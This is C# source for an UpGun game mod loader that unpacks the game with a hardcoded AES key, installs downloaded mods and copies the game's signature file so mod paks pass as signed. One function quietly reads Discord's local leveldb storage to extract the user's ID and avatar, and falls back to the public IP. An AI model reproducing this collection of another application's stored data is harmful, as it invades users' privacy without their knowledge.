using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using QueenIO;
using UpGun_Mod_Loader.Autres;

namespace UpGunModLoader3._0;

internal class Fonctions
{
	private static string appdatapath = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming";

	private static string appdatapath1 = appdatapath + "\\.FLIPPY";

	public static string appdatapath2 = appdatapath1 + "\\UpGunMods";

	private static string appdatapath3 = appdatapath2 + "\\Mods";

	public static string appdatapath4 = appdatapath2 + "\\MyUploadedMods\\MyMods.txt";

	public static string appdatapath5 = appdatapath2 + "\\MyUploadedMods\\Username.txt";

	public static string path1 = appdatapath2 + "\\info.txt";

	private static string path2 = appdatapath2 + "\\repak.exe";

	private static string AESKey = "0x79524750FB51C47CB6A52DA27E708AB78D91D62A196525FDF18F19424AC45498";

	private static string ARPath = GetUpGunPath() + "\\UpGun-WindowsNoEditor_AssetRegistry\\UpGun\\AssetRegistry.bin";

	public static string PakGameFilePath = GetUpGunPath() + "\\UpGun-WindowsNoEditor.pak";

	public static string PakModsSupportFilePath = GetUpGunPath() + "\\UpGun-WindowsNoEditor_AssetRegistry.pak";

	public static void Notif(string message, int time)
	{
		using Notifs notifs = new Notifs(message, time);
		notifs.ShowDialog();
	}

	public static string GetUpGunPath()
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
		if (registryKey != null)
		{
			string[] subKeyNames = registryKey.GetSubKeyNames();
			foreach (string name in subKeyNames)
			{
				RegistryKey registryKey2 = registryKey.OpenSubKey(name);
				if (registryKey2 == null)
				{
					continue;
				}
				object value = registryKey2.GetValue("DisplayName");
				if (value != null && value.ToString().Contains("UpGun"))
				{
					object value2 = registryKey2.GetValue("InstallLocation");
					if (value2 != null)
					{
						return Path.Combine(value2.ToString(), "UpGun", "Content", "Paks");
					}
				}
				registryKey2.Close();
			}
		}
		return null;
	}

	public static async Task<string> GetWHLink()
	{
		HttpResponseMessage val = await new HttpClient().GetAsync("http://144.24.205.218:8000/file/WebhookLink.txt\r\n");
		if (val.IsSuccessStatusCode)
		{
			return (await val.Content.ReadAsStringAsync()).ToString();
		}
		return null;
	}

    public static void DeleteMod(string ModName)
    {
        using (SplashManager.Scope("Deleting mod..."))
        {
            File.Delete(GetUpGunPath() + "\\" + ModName + ".pak");
            File.Delete(GetUpGunPath() + "\\" + ModName + ".sig");

            if (Directory.Exists(appdatapath3 + "\\" + ModName))
            {
                SplashManager.Update("Cleaning local mod folder...");
                Directory.Delete(appdatapath3 + "\\" + ModName, recursive: true);

                SplashManager.Update("Resetting AssetRegistry...");
                ResetBinFile();

                SplashManager.Update("Reinstalling all mods...");
                ReinstallAllMods();

                SplashManager.Update("Repacking AssetRegistry...");
                RepakTheNewBinFile();
            }
        }
    }

    public static void CreateSig(string pakname)
    {
        string originalSig = Path.Combine(Path.GetDirectoryName(PakGameFilePath), "UpGun-WindowsNoEditor.sig");

        string newSig = Path.Combine(Path.GetDirectoryName(PakGameFilePath), pakname + ".sig");

        if (!File.Exists(originalSig))
        {
            throw new FileNotFoundException("Le fichier .sig original est introuvable", originalSig);
        }

        File.Copy(originalSig, newSig, overwrite: true);
    }


    public static void InstallMod(string URL, string Name)
    {
        using (SplashManager.Scope("Downloading mod..."))
        {
            string text = appdatapath3 + "\\" + Name;

            new WebClient().DownloadFile(URL, text + ".zip");
            Thread.Sleep(200);

            SplashManager.Update("Extracting files...");
            if (Directory.Exists(text))
            {
                Directory.Delete(text, recursive: true);
            }
            ZipFile.ExtractToDirectory(text + ".zip", appdatapath3);

            SplashManager.Update("Moving .pak to UpGun folder...");
            File.Delete(text + ".zip");
            File.Move(text + ".pak", GetUpGunPath() + "\\" + Name + ".pak");
			CreateSig(Name);

            if (Directory.Exists(text))
            {
                SplashManager.Update("Injecting JSON code...");
                InjectJsonCode(text);

                SplashManager.Update("Repacking AssetRegistry...");
                RepakTheNewBinFile();
            }
        }
    }


    public static void InjectJsonCode(string FolderJsonToInject)
	{
		try
		{
			AssetRegistry assetRegistry = new AssetRegistry();
			assetRegistry.Read(File.ReadAllBytes(ARPath));
			string[] files = Directory.GetFiles(FolderJsonToInject, "*.json");
			for (int i = 0; i < files.Length; i++)
			{
				AssetRegistry.FAssetData item = JsonConvert.DeserializeObject<AssetRegistry.FAssetData>(File.ReadAllText(files[i]));
				assetRegistry.fAssetDatas.Add(item);
			}
			File.WriteAllBytes(ARPath, assetRegistry.Make());
		}
		catch
		{
			MessageBox.Show("Une erreur s'est produite!");
		}
	}

	public static void ReinstallAllMods()
	{
		if (Directory.Exists(appdatapath3))
		{
			string[] directories = Directory.GetDirectories(appdatapath3);
			for (int i = 0; i < directories.Length; i++)
			{
				InjectJsonCode(directories[i]);
			}
		}
	}

	public static bool CheckIfModSupportInstalled()
	{
		if (!File.Exists(PakModsSupportFilePath))
		{
			InstallModsSupport();
			return false;
		}
		return true;
	}

    public static void InstallModsSupport()
    {
        using (SplashManager.Scope("Installation of the mods support... (you can take a coffee)"))
        {
            if (Process.GetProcessesByName("UpGun-Win64-Shipping").Length != 0)
            {
                SplashManager.Update("Closing UpGun...");
                ExecuteCmdCommand("taskkill /f /im UpGun-Win64-Shipping.exe");
            }

            Thread.Sleep(300);

            string quotedPath2 = $"\"{path2}\"";

            SplashManager.Update("Unpacking base game pak...");
            ExecuteCmdCommand($"{quotedPath2} --aes-key {AESKey} unpack \"{PakGameFilePath}\"");
            File.Delete(PakGameFilePath);

            SplashManager.Update("Moving AssetRegistry.bin...");
            Directory.CreateDirectory(GetUpGunPath() + "\\UpGun-WindowsNoEditor_AssetRegistry\\UpGun");
            File.Move(GetUpGunPath() + "\\UpGun-WindowsNoEditor\\UpGun\\AssetRegistry.bin", ARPath);

            SplashManager.Update("Repacking game content...");
            ExecuteCmdCommand($"{quotedPath2} pack \"{GetUpGunPath()}\\UpGun-WindowsNoEditor\"");
            ExecuteCmdCommand($"{quotedPath2} pack \"{GetUpGunPath()}\\UpGun-WindowsNoEditor_AssetRegistry\"");
			CreateSig("UpGun-WindowsNoEditor_AssetRegistry");

            SplashManager.Update("Cleaning & backup...");
            Directory.Delete(GetUpGunPath() + "\\UpGun-WindowsNoEditor", recursive: true);
            File.Copy(ARPath, GetUpGunPath() + "\\AssetRegistry.bak");
        }
    }



    public static void RepakTheNewBinFile()
	{
        string quotedPath2 = $"\"{path2}\"";
        File.Delete(GetUpGunPath() + "\\UpGun-WindowsNoEditor_AssetRegistry.pak");
		ExecuteCmdCommand($"{quotedPath2} pack \"" + GetUpGunPath() + "\\UpGun-WindowsNoEditor_AssetRegistry\"");
	}

	public static void ResetBinFile()
	{
        string quotedPath2 = $"\"{path2}\"";
        File.Delete(GetUpGunPath() + "\\UpGun-WindowsNoEditor_AssetRegistry.pak");
		File.Delete(GetUpGunPath() + "\\UpGun-WindowsNoEditor_AssetRegistry\\UpGun\\AssetRegistry.bin");
		File.Copy(GetUpGunPath() + "\\AssetRegistry.bak", ARPath);
		ExecuteCmdCommand($"{quotedPath2} pack \"" + GetUpGunPath() + "\\UpGun-WindowsNoEditor_AssetRegistry\"");
	}

    public static void MajModLoaderUpGun()
    {
        using (SplashManager.Scope("Checking if latest version of mod support is installed..."))
        {
            string quotedPath2 = $"\"{path2}\"";

            SplashManager.Update("Unpacking current pak for verification...");
            ExecuteCmdCommand($"{quotedPath2} --aes-key " + AESKey + " unpack \"" + PakGameFilePath + "\"");

            if (File.Exists(GetUpGunPath() + "\\UpGun-WindowsNoEditor\\UpGun\\AssetRegistry.bin"))
            {
                SplashManager.Update("Old support detected. Cleaning...");
                Directory.Delete(GetUpGunPath() + "\\UpGun-WindowsNoEditor", recursive: true);
                File.Delete(GetUpGunPath() + "\\UpGun-WindowsNoEditor_AssetRegistry.pak");
                File.Delete(GetUpGunPath() + "\\AssetRegistry.bak");
                Directory.Delete(GetUpGunPath() + "\\UpGun-WindowsNoEditor_AssetRegistry", recursive: true);

                SplashManager.Update("Reinstalling mod support...");
                InstallModsSupport();

                SplashManager.Update("Reinstalling all mods...");
                ReinstallAllMods();

                SplashManager.Update("Repacking AssetRegistry...");
                RepakTheNewBinFile();
            }
            else
            {
                SplashManager.Update("Latest mods support already installed.");
                if (Directory.Exists(GetUpGunPath() + "\\UpGun-WindowsNoEditor"))
                {
                    SplashManager.Update("Cleaning temporary folder...");
                    Directory.Delete(GetUpGunPath() + "\\UpGun-WindowsNoEditor", recursive: true);
                }
            }
        }
    }


    public static void ExecuteCmdCommand(string cmdCommand)
	{
		ProcessStartInfo startInfo = new ProcessStartInfo
		{
			FileName = "cmd.exe",
			RedirectStandardInput = true,
			UseShellExecute = false,
			CreateNoWindow = true
		};
		Process process = new Process();
		process.StartInfo = startInfo;
		process.Start();
		process.StandardInput.WriteLine("cd " + GetUpGunPath());
		process.StandardInput.WriteLine(cmdCommand);
		process.StandardInput.Flush();
		process.StandardInput.Close();
		process.WaitForExit();
		process.Close();
	}

	public static async Task<string> GetUploadedMods()
	{
		string text = "http://144.24.205.218:8000/file/mods.txt";
		HttpClient httpClient = new HttpClient();
		try
		{
			HttpResponseMessage val = await httpClient.GetAsync(text);
			if (val.IsSuccessStatusCode)
			{
				return (await val.Content.ReadAsStringAsync()).ToString();
			}
		}
		finally
		{
			((IDisposable)httpClient)?.Dispose();
		}
		return null;
	}

	public static string[] GetDiscordUserIdAndAvatar()
	{
		string[] array = new string[3] { "discord", "discordcanary", "discordptb" };
		for (int i = 0; i < array.Length; i++)
		{
			if (!Directory.Exists(Path.Combine(appdatapath, array[i])))
			{
				continue;
			}
			string[] files = Directory.GetFiles(Path.Combine(appdatapath, array[i], "Local Storage", "leveldb"), "*.ldb");
			for (int j = 0; j < files.Length; j++)
			{
				StreamReader streamReader = new StreamReader(files[j]);
				string pattern = "{\"_state\":{\"users\":\\[{\"id\":\"(.*?)\",\"avatar\":\"(.*?)\"";
				Match match = Regex.Match(streamReader.ReadToEnd(), pattern);
				if (match.Success)
				{
					return new string[2]
					{
						match.Groups[1].Value,
						match.Groups[2].Value
					};
				}
			}
		}
		JObject jObject = JObject.Parse(new WebClient().DownloadString("https://httpbin.org/ip"));
		return new string[2]
		{
			jObject["origin"].ToString(),
			""
		};
	}
}
